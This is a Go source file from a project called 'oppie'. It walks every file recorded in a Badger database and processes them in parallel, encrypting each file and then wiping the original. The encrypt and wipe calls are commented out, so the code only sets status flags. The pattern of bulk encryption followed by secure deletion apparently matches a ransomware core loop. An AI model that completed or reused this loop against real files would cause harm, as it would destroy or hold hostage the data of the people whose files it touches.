package traversal

import (
	"fmt"
	"runtime"
	"sync"

	"github.com/dgraph-io/badger/v4"
	"github.com/savi2w/oppie/encrypt"
	"github.com/savi2w/oppie/model"
	"github.com/savi2w/oppie/storage"
)

type Encryptor struct {
	Badger    *storage.Badger
	Core      *encrypt.Core
	WaitGroup sync.WaitGroup
}

func NewEncryptor(badger *storage.Badger, core *encrypt.Core) *Encryptor {
	return &Encryptor{
		Badger:    badger,
		Core:      core,
		WaitGroup: sync.WaitGroup{},
	}
}

const ParallelFactor = 8

func (enc *Encryptor) Iterate() {
	err := enc.Badger.DB.View(func(txn *badger.Txn) error {
		iterator := txn.NewIterator(badger.DefaultIteratorOptions)

		defer iterator.Close()

		cores := runtime.NumCPU()
		channel := make(chan struct{}, cores*ParallelFactor)

		defer close(channel)

		for iterator.Rewind(); iterator.Valid(); iterator.Next() {
			badgerItem := iterator.Item()
			fileKey := string(badgerItem.Key())

			err := badgerItem.Value(func(value []byte) error {
				file, err := unmarshalFile(fileKey, enc.Badger, value)
				if err != nil {
					return err
				}

				channel <- struct{}{}
				enc.WaitGroup.Add(1)

				go enc.processFile(file, channel)

				return nil
			})

			if err != nil {
				fmt.Printf("Error iterating file %s: %s", fileKey, err.Error())

				continue
			}
		}

		for index := 0; index < cores*ParallelFactor; index++ {
			channel <- struct{}{}
		}

		return nil
	})

	if err != nil {
		fmt.Printf("Error iterating files: %s", err.Error())
	}
}

func (enc *Encryptor) processFile(file *model.File, channel chan struct{}) {
	defer func() { <-channel; enc.WaitGroup.Done() }()

	fmt.Printf("[Process] Processing file %s\n", file.Key)

	if !file.IsEncrypted {
		// esK, err := enc.Core.File(file.Path)
		// if err != nil {
		// 	fmt.Printf("[Process] Error encrypting file %s: %s", file.Key, err.Error())
		// 	return
		// }

		file.IsEncrypted = true
		// file.Kyber = &esK

		if err := file.Commit(); err != nil {
			fmt.Printf("[Process][E] Error saving file %s: %s", file.Key, err.Error())
			return
		}
	}

	if !file.IsDeleted {
		// if err := fsutil.Wipe(file.Path); err != nil {
		// 	fmt.Printf("[Process] Error wipping file %s: %s", file.Key, err.Error())
		// 	return
		// }

		file.IsDeleted = true

		if err := file.Commit(); err != nil {
			fmt.Printf("[Process][W] Error saving file %s: %s", file.Key, err.Error())
			return
		}
	}

	fmt.Printf("[Process][OK] Processing file %s\n", file.Key)
}
